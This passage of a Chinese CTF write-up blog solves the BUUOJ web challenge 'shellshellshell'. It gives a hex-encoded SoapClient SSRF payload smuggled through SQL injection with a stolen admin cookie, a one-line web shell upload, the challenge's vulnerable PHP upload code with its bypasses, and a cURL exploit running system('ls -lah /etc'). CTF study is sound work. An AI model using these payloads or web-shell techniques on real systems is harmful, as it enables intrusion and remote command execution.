+<p>然后新建一个用户，正常登陆，在publish的时候提交signature=q3e13`,0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3137333a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d6b767673363439363034743439387067633573703933366f61350d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d343937353637223b733a31333a225f736f61705f76657273696f6e223b693a313b7d)%23&mood=1一大串16进制字符为刚才Payload的结果。然后访问一下index.php，会返回500，我们的目的已经达到了。</p>
+<p>用Payload中的Cookie登陆，就进入admin了。</p>
+<p>publish页面变为上传了，我们可以上传任意的文件，没有做任何限制。我们上传个一句话然后AntSword连接。</p>
+<h1 id="part-3.-internat-exploit">Part 3. Internat Exploit</h1>
+<p>扫一下IP，在.7那里有一个index.php文件，拖回来看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">&#x27;/var/sandbox/&#x27;</span> . md5(<span class="string">&quot;prefix&quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;file&#x27;</span>]) ? $_POST[<span class="string">&#x27;file&#x27;</span>] : $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">&#x27;.&#x27;</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;try again!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (<span class="keyword">string</span>)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">&quot;.&quot;</span>.$ext;</span><br><span class="line">    move_uploaded_file([<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&#x27;@&lt;?php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_,$new_name)===<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can do it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>老题了，如果<span class="math inline">\(ext==\)</span>filename[count($filename) - 1]，die()，<span class="math inline">\(filename可以直接传入，因此我们可以传个file[0]与file[1]，问题在于end()，end()返回数组最后一个元素，但并不是按照数组索引的顺序排列的，而是按照赋值顺序。也就是说我们传入file[1]=aaa,file[0]=bbb，文件名为bbb.aaa，end()返回的是bbb，第一个die就可以绕过了。然后是将传入的文件重命名成000-999之间随机的数字+\)</span>ext。然后unlink()删除，unlink()是可以绕过的。如果unlink传入的文件名带有路径字符，就会失败。如传入"aaa.php/."，move_uploaded_file()会将文件名正规化处理，删掉不必要的字符，结果/.被删除，但是unlink()无法处理路径，直接返回失败，导致文件被保留。</p>
+<p>最后一个问题，我们没办法直接访问到shell，要通过POST的Hello访问，因此我们的Shell要以@<?php开头，为了方便起见我们直接写system了。flag在/etc目录下的一个txt里。
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, <span class="keyword">array</span>(</span><br><span class="line">  CURLOPT_URL =&gt; <span class="string">&quot;http://172.64.190.7&quot;</span>,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">  CURLOPT_ENCODING =&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; <span class="number">10</span>,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; <span class="string">&quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;tr1ple.php\&quot;\r\nContent-Type: false\r\n\r\n@&lt;?php system(&#x27;ls -lah /etc&#x27;);\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;hello\&quot;\r\n\r\ntr1ple11.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[2]\&quot;\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[1]\&quot;\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[0]\&quot;\r\n\r\n/../tr1ple11.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;submit\&quot;\r\n\r\nSubmit\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;</span>,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cache-control: no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;</span></span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($err) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;cURL Error #:&quot;</span> . $err;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 在外层题目中访问/upload/php文件名即可拿到flag。</p>
+
+    <div id="aplayer-vfAFYZzb" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="27514091" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{a09a9251-0245-48d5-8f29-00b18ef2218c}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/" title="BUUOJ刷题-Web-shellshellshell">http://tiaonmmn.github.io/2019/09/17/BUUOJ刷题-Web-shellshellshell/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/BUUOJ/" rel="tag"><i class="fa fa-tag"></i> BUUOJ</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+              <a href="/tags/%E7%9B%B2%E6%B3%A8/" rel="tag"><i class="fa fa-tag"></i> 盲注</a>
+              <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+              <a href="/tags/SoapClient/" rel="tag"><i class="fa fa-tag"></i> SoapClient</a>
+              <a href="/tags/Slepp/" rel="tag"><i class="fa fa-tag"></i> Slepp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/09/17/CSAW-Quals-2019-Unagi/" rel="prev" title="CSAW Quals 2019 Unagi">
+                  <i class="fa fa-chevron-left"></i> CSAW Quals 2019 Unagi
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/" rel="next" title="BUUOJ刷题-Web-nextphp">
+                  BUUOJ刷题-Web-nextphp <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
